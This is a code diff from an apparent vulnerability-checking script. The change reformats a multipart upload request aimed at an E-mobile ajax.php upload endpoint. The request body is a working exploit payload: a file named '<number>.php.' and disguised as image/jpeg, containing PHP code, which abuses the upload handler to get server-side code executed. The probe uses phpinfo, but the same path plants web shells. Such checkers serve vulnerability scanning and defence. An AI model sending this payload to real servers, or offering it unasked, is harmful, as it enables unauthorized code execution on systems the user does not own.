@@ -21,17 +21,17 @@ def verify(url):
     }
     num = str(random.randint(1000, 10000))
     data = f'''
-        ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
-        Content-Disposition: form-data; name="upload_quwan"; filename="{num}.php."
-        Content-Type: image/jpeg
-         
-        <?php phpinfo();?>
-        ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
-        Content-Disposition: form-data; name="file"; filename=""
-        Content-Type: application/octet-stream
-         
-         
-        ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt--
+------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
+Content-Disposition: form-data; name="upload_quwan"; filename="{num}.php."
+Content-Type: image/jpeg
+ 
+<?php phpinfo();?>
+------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
+Content-Disposition: form-data; name="file"; filename=""
+Content-Type: application/octet-stream
+ 
+ 
+------WebKitFormBoundarydRVCGWq4Cx3Sq6tt--
     '''
     vurl = urllib.parse.urljoin(url, "/E-mobile/App/Ajax/ajax.php?action=mobile_upload_save")
     try:
